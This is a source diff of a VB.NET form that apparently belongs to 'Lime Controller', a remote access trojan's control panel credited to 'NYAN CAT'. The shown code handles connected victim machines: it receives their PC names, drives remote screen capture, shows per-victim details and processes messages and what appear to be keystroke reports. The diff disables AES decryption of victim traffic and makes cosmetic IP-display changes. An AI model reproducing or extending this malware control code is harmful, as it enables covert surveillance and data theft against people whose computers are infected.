@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on MAR./15/2018        ##
+'##        N Y A N   C A T  |||   Updated on MAR./16/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -53,6 +53,7 @@ Public Class Form1
         Application.Exit()
         End
     End Sub
+
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
         Control.CheckForIllegalCrossThreadCalls = False
 
@@ -72,7 +73,7 @@ Public Class Form1
         Catch ex As Exception
         End Try
 
-        Me.Text = "Lime Controller v0.4.1"
+        Me.Text = "Lime Controller v0.4.1B"
 
     End Sub
 #End Region
@@ -83,21 +84,21 @@ Public Class Form1
         SyncLock L1.Items
             Try
                 L1.Items(u.IP).Remove()
-                Messages("{" + u.IP + "}", "Disconnected")
+                Messages("{" + u.IP.Split(":")(0) + "}", "Disconnected")
             Catch ex As Exception
             End Try
         End SyncLock
     End Sub
 
     Private Sub S_Connected(ByVal u As USER) Handles S.Connected
-        Messages("{" + u.IP + "}", "Connected")
+        Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
     End Sub
 
     Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
     Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
-        Dim E As String = AES_Decrypt(BS(b))
-        Dim A As String() = Split(E, SPL)
-
+        ' Dim E As String = AES_Decrypt(BS(b))
+        ' Dim A As String() = Split(E, SPL)
+        Dim A As String() = Split(BS(b), SPL)
         Try
             Select Case A(0)
                 Case "info" ' Client Sent me PC name
@@ -164,7 +165,7 @@ Public Class Form1
                     Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
                     If Cap IsNot Nothing Then
                         If A(1).Length = 1 Then
-                            Cap.Text = "Size: " & siz(b.Length) & " ,No Changes"
+                            Cap.Text = u.IP + " Size: " & siz(b.Length) & " ,No Changes"
                             If Cap.Button1.Text = "Stop" Then
                                 S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2.Text & SPL & Cap.C.Value)
                             End If
@@ -186,6 +187,7 @@ Public Class Form1
                         D.F = Me
                         D.U = u
                         D.Name = "D" + u.IP
+                        D.Text = "Details " + u.IP.Split(":")(0)
                         D.Show()
                     End If
 
@@ -208,7 +210,7 @@ Public Class Form1
                     D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
                 Case "MSG"
-                    Messages("{" + u.IP + "}", A(1).ToString)
+                    Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)
 
                 Case "Key"
 
